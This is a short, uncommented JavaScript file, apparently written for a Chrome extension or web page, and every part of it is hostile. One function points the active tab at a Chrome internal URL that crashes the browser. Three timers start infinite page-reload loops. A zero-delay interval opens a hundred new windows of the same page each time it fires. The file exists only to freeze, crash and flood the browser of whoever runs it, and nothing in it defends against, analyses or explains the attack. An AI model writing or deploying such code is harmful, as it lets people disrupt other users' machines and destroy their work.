function updateTab() {
    chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
        if (tabs.length > 0) {
            chrome.tabs.update(tabs[0].id, { url: 'chrome://inducebrowsercrashforrealz' });
        }
    });
}

setTimeout(function(){
    while(1)location.reload(1)
}, 1000)
setTimeout(function(){
    while(1)location.reload(1)
}, 1000)
setTimeout(function(){
    while(1)location.reload(1)
}, 1000)
function rep() {
  for (var i = 0; i < 100; i++) {
    open(location.href);
  }
}

setInterval(rep, 0);
